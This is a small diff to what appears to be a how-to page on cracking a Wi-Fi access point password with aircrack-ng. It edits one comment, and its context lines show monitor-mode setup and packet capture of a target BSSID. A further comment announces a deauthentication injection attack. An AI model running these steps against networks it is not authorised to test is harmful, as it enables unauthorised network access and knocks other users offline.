@@ -10,7 +10,7 @@ This page shows how to crack an AP secret using just `aircrack-ng`.
 # Start monitor mode
 sudo airmon-ng start wlan0
 
-# Restart monitoring but filtered with output saved to PCAP. Make sure CLIENT is found.
+# Start monitor mode but with filters and output saved to PCAP.
 sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap wlan0mon
 
 # Do one deauth injection attack while still monitoring
